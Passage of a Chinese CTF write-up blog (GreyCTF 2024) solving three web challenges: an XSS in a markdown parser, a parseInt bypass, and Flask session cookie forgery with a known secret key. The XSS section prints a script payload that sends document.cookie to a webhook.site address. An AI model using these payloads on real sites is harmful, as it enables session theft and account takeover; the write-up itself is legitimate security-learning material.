<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>graycatCTF2024 wp</title>
      <link href="/2024/07/14/graycatCTF2024-wp/"/>
      <url>/2024/07/14/graycatCTF2024-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="Markdown-Parser-114-solves-100-points"><a href="#Markdown-Parser-114-solves-100-points" class="headerlink" title="Markdown Parser(114 solves &#x2F; 100 points)"></a><strong>Markdown Parser</strong>(114 solves &#x2F; 100 points)</h2><p>题目给了附件，打开题目，发现有一个写markdown的地方，写好之后会自动帮你把格式转换好，之后交给后台检查，那么就是xss，我们直接看源代码，直接看最关键的文件，是怎么格式化markdown的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseMarkdown</span>(<span class="params">markdownText</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> lines = markdownText.<span class="title function_">split</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> htmlOutput = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> inCodeBlock = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    lines.<span class="title function_">forEach</span>(<span class="function"><span class="params">line</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (inCodeBlock) &#123;</span><br><span class="line">            <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;```&#x27;</span>)) &#123;</span><br><span class="line">                inCodeBlock = <span class="literal">false</span>;</span><br><span class="line">                htmlOutput += <span class="string">&#x27;&lt;/code&gt;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                htmlOutput += <span class="title function_">escapeHtml</span>(line) + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;```&#x27;</span>)) &#123;</span><br><span class="line">                language = line.<span class="title function_">substring</span>(<span class="number">3</span>).<span class="title function_">trim</span>();</span><br><span class="line">                inCodeBlock = <span class="literal">true</span>;</span><br><span class="line">                htmlOutput += <span class="string">&#x27;&lt;pre&gt;&lt;code class=&quot;language-&#x27;</span> + language + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                line = <span class="title function_">escapeHtml</span>(line);</span><br><span class="line">                line = line.<span class="title function_">replace</span>(<span class="regexp">/`(.*?)`/g</span>, <span class="string">&#x27;&lt;code&gt;$1&lt;/code&gt;&#x27;</span>);</span><br><span class="line">                line = line.<span class="title function_">replace</span>(<span class="regexp">/^(######\s)(.*)/</span>, <span class="string">&#x27;&lt;h6&gt;$2&lt;/h6&gt;&#x27;</span>);</span><br><span class="line">                line = line.<span class="title function_">replace</span>(<span class="regexp">/^(#####\s)(.*)/</span>, <span class="string">&#x27;&lt;h5&gt;$2&lt;/h5&gt;&#x27;</span>);</span><br><span class="line">                line = line.<span class="title function_">replace</span>(<span class="regexp">/^(####\s)(.*)/</span>, <span class="string">&#x27;&lt;h4&gt;$2&lt;/h4&gt;&#x27;</span>);</span><br><span class="line">                line = line.<span class="title function_">replace</span>(<span class="regexp">/^(###\s)(.*)/</span>, <span class="string">&#x27;&lt;h3&gt;$2&lt;/h3&gt;&#x27;</span>);</span><br><span class="line">                line = line.<span class="title function_">replace</span>(<span class="regexp">/^(##\s)(.*)/</span>, <span class="string">&#x27;&lt;h2&gt;$2&lt;/h2&gt;&#x27;</span>);</span><br><span class="line">                line = line.<span class="title function_">replace</span>(<span class="regexp">/^(#\s)(.*)/</span>, <span class="string">&#x27;&lt;h1&gt;$2&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">                line = line.<span class="title function_">replace</span>(<span class="regexp">/\*\*(.*?)\*\*/g</span>, <span class="string">&#x27;&lt;strong&gt;$1&lt;/strong&gt;&#x27;</span>);</span><br><span class="line">                line = line.<span class="title function_">replace</span>(<span class="regexp">/__(.*?)__/g</span>, <span class="string">&#x27;&lt;strong&gt;$1&lt;/strong&gt;&#x27;</span>);</span><br><span class="line">                line = line.<span class="title function_">replace</span>(<span class="regexp">/\*(.*?)\*/g</span>, <span class="string">&#x27;&lt;em&gt;$1&lt;/em&gt;&#x27;</span>);</span><br><span class="line">                line = line.<span class="title function_">replace</span>(<span class="regexp">/_(.*?)_/g</span>, <span class="string">&#x27;&lt;em&gt;$1&lt;/em&gt;&#x27;</span>);</span><br><span class="line">                htmlOutput += line;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> htmlOutput;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">text</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#039;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    parseMarkdown</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有了之前比赛的经验，一眼就能看到这里有能注入的地方</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlOutput += <span class="string">&#x27;&lt;pre&gt;&lt;code class=&quot;language-&#x27;</span> + language + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>用引号把他闭合，随即构造出payload</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```js&quot; onload=&quot;alert(1)</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>上传解析后构造出来的是下面标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">code</span> <span class="attr">class</span>=<span class="string">&quot;language-js hljs language-javascript&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">data-highlighted</span>=<span class="string">&quot;yes&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是发现并没有弹窗</p><p>随后我尝试了onerror onblur onfocus ononline等等都没有效果，就只有一个onclick有效果，但是我们看到机器人是没有click的动作的，也是在这一个地方钻的太死了，随后就想到用尖括号闭合后再构造一个<code>&lt;script&gt;</code>出来，构造下面payload</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```12&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>成功弹窗</p><p>被解析后的代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">code</span> <span class="attr">class</span>=<span class="string">&quot;language-12&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&quot;<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么接下来就是把cookie弹到接收站</p><p>构造下面</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```12&quot;&gt;&lt;script&gt;fetch(`https://webhook.site/886c0266-b6f5-4dc0-ae07-a9565f6b907a/`+document.cookie)&lt;/script&gt;&quot;</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>上传后台得到下面收包</p><p>获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grey&#123;m4rkd0wn_th1s_fl4g&#125;</span><br></pre></td></tr></table></figure><h2 id="Greyctf-Survey-154-solves-100-points"><a href="#Greyctf-Survey-154-solves-100-points" class="headerlink" title="Greyctf Survey(154 solves &#x2F; 100 points)"></a><strong>Greyctf Survey</strong>(154 solves &#x2F; 100 points)</h2><p>同样题目给了源码，题目里面有个滑条，然后提交，不知道要干什么，直接看源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">&quot;./config.json&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/&quot;</span>, express.<span class="title function_">static</span>(<span class="string">&quot;static&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> score = -<span class="number">0.42069</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/status&quot;</span>, <span class="title function_">async</span> (req, res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="string">&quot;error&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: score</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vote&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;vote&#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> vote != <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="string">&quot;error&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Vote must be a number&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(vote &lt; <span class="number">1</span> &amp;&amp; vote &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        score += <span class="built_in">parseInt</span>(vote);</span><br><span class="line">        <span class="keyword">if</span>(score &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            score = -<span class="number">0.42069</span>;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">                <span class="string">&quot;error&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;msg&quot;</span>: config.<span class="property">flag</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="string">&quot;error&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&quot;data&quot;</span>: score,</span><br><span class="line">            <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Vote submitted successfully&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="string">&quot;error&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid vote&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Survey listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>代码很好懂，滑动滑条，提交<code>vote</code>，<code>score</code>会加上一个<code>vote</code>如果<code>score</code>的值大于1，那么就输出flag，按照理论来说随便传两个0.99就通过了，但是发现还是没有flag，并且这个比赛都是公共靶机，如果有人一直恶意发包那么<code>score</code>的值就永远是-0.42069，那么我们就要找找其他的漏洞，我们可以看到在增加score的地方</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">score += <span class="built_in">parseInt</span>(vote);</span><br></pre></td></tr></table></figure><p>这里用了<code>parseInt</code>来将<code>vote</code>转换成整型int，但是<code>parseInt</code>函数有一个问题，参考文章</p><blockquote><p><a href="https://dmitripavlutin.com/parseint-mystery-javascript/">https://dmitripavlutin.com/parseint-mystery-javascript/</a></p></blockquote><p>文章里测试到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.5</span>);      <span class="comment">// =&gt; 0</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.05</span>);     <span class="comment">// =&gt; 0</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.005</span>);    <span class="comment">// =&gt; 0</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.0005</span>);   <span class="comment">// =&gt; 0</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.00005</span>);  <span class="comment">// =&gt; 0</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.000005</span>); <span class="comment">// =&gt; 0</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.0000005</span>); <span class="comment">// =&gt; 5</span></span><br></pre></td></tr></table></figure><p> 这是因为<code>0.0000005</code>会被解析成科学技术法<code>5e-7</code></p><p>所以只要传<code>0.0000005</code>就能大于1了</p><p>抓包改值发送</p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grey&#123;50m371m35_4_l177l3_6035_4_l0n6_w4y&#125;</span><br></pre></td></tr></table></figure><h2 id="Baby-Web-183-solves-100-points"><a href="#Baby-Web-183-solves-100-points" class="headerlink" title="Baby Web(183 solves &#x2F; 100 points)"></a><strong>Baby Web</strong>(183 solves &#x2F; 100 points)</h2><p>给了一个附件，里面是python flask的代码，是一段不完整的代码，先看源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;baby-web&quot;</span></span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">r&quot;grey&#123;fake_flag&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># Set session if not found</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;is_admin&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&quot;is_admin&quot;</span>] = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="comment"># Check if the user is admin through cookies</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;admin.html&quot;</span>, flag=FLAG, is_admin=session.get(<span class="string">&quot;is_admin&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">### Some other hidden code ###</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>判断<code>is_admin</code>是否等于<code>true</code>，给了<code>secret_key</code>那么就非常方便能伪造了</p><p>打开网站拿到<code>session</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJpc19hZG1pbiI6ZmFsc2V9.ZiVFcQ.w2yt1Nh884RwoYjrrtGaB20CBMs</span><br></pre></td></tr></table></figure><p>然后丢到flask session的爆破脚本里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c <span class="string">&quot;eyJpc19hZG1pbiI6dHJ1ZX0.ZiP8Eg.17rmypB5zIhBJp9Ve4pgJfLwJsw&quot;</span> -s <span class="string">&quot;baby-web&quot;</span></span><br></pre></td></tr></table></figure><p>爆破拿到格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;is_admin&#x27;<span class="punctuation">:</span> False<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>之后伪造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&quot;baby-web&quot;</span> -t <span class="string">&quot;&#123;&#x27;is_admin&#x27;: True&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>得到伪造的session</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJpc19hZG1pbiI6dHJ1ZX0.ZiVFrw.5KhLMB4XVo0BjmX4iJXPb5Am3z0</span><br></pre></td></tr></table></figure><p>伪造成功访问admin还是没有拿到flag，但是看源码，flag是传到admin页面的，我们看源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bootstrap demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">async</span>=<span class="string">&quot;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css">                      <span class="selector-class">.htmx-indicator</span>&#123;<span class="attribute">opacity</span>:<span class="number">0</span>&#125;                      <span class="selector-class">.htmx-request</span> <span class="selector-class">.htmx-indicator</span>&#123;<span class="attribute">opacity</span>:<span class="number">1</span>; <span class="attribute">transition</span>: opacity <span class="number">200ms</span> ease-in;&#125;                      <span class="selector-class">.htmx-request</span><span class="selector-class">.htmx-indicator</span>&#123;<span class="attribute">opacity</span>:<span class="number">1</span>; <span class="attribute">transition</span>: opacity <span class="number">200ms</span> ease-in;&#125;                    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-id">#_copy</span>&#123;<span class="attribute">align-items</span>:center;<span class="attribute">background</span>:<span class="number">#4494d5</span>;<span class="attribute">border-radius</span>:<span class="number">3px</span>;<span class="attribute">color</span>:<span class="number">#fff</span>;<span class="attribute">cursor</span>:pointer;<span class="attribute">display</span>:flex;<span class="attribute">font-size</span>:<span class="number">13px</span>;<span class="attribute">height</span>:<span class="number">30px</span>;<span class="attribute">justify-content</span>:center;<span class="attribute">position</span>:absolute;<span class="attribute">width</span>:<span class="number">60px</span>;<span class="attribute">z-index</span>:<span class="number">1000</span>&#125;<span class="selector-id">#select-tooltip</span>,<span class="selector-id">#sfModal</span>,<span class="selector-class">.modal-backdrop</span>,<span class="selector-tag">div</span><span class="selector-attr">[id^=reader-helper]</span>&#123;<span class="attribute">display</span>:none<span class="meta">!important</span>&#125;<span class="selector-class">.modal-open</span>&#123;<span class="attribute">overflow</span>:auto<span class="meta">!important</span>&#125;._sf_adjust_body&#123;<span class="attribute">padding-right</span>:<span class="number">0</span><span class="meta">!important</span>&#125;<span class="selector-class">.super_copy_btns_div</span>&#123;<span class="attribute">position</span>:fixed;<span class="attribute">width</span>:<span class="number">154px</span>;<span class="attribute">left</span>:<span class="number">10px</span>;<span class="attribute">top</span>:<span class="number">45%</span>;<span class="attribute">background</span>:<span class="number">#e7f1ff</span>;<span class="attribute">border</span>:<span class="number">2px</span> solid <span class="number">#4595d5</span>;<span class="attribute">font-weight</span>:<span class="number">600</span>;<span class="attribute">border-radius</span>:<span class="number">2px</span>;<span class="attribute">font-family</span>:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;<span class="attribute">z-index</span>:<span class="number">5000</span>&#125;<span class="selector-class">.super_copy_btns_logo</span>&#123;<span class="attribute">width</span>:<span class="number">100%</span>;<span class="attribute">background</span>:<span class="number">#4595d5</span>;<span class="attribute">text-align</span>:center;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">color</span>:<span class="number">#e7f1ff</span>;<span class="attribute">line-height</span>:<span class="number">30px</span>;<span class="attribute">height</span>:<span class="number">30px</span>&#125;<span class="selector-class">.super_copy_btns_btn</span>&#123;<span class="attribute">display</span>:block;<span class="attribute">width</span>:<span class="number">128px</span>;<span class="attribute">height</span>:<span class="number">28px</span>;<span class="attribute">background</span>:<span class="number">#7f5711</span>;<span class="attribute">border-radius</span>:<span class="number">4px</span>;<span class="attribute">color</span>:<span class="number">#fff</span>;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">border</span>:<span class="number">0</span>;<span class="attribute">outline</span>:<span class="number">0</span>;<span class="attribute">margin</span>:<span class="number">8px</span> auto;<span class="attribute">font-weight</span>:<span class="number">700</span>;<span class="attribute">cursor</span>:pointer;<span class="attribute">opacity</span>:.<span class="number">9</span>&#125;<span class="selector-class">.super_copy_btns_btn</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">opacity</span>:.<span class="number">8</span>&#125;<span class="selector-class">.super_copy_btns_btn</span><span class="selector-pseudo">:active</span>&#123;<span class="attribute">opacity</span>:<span class="number">1</span>&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span 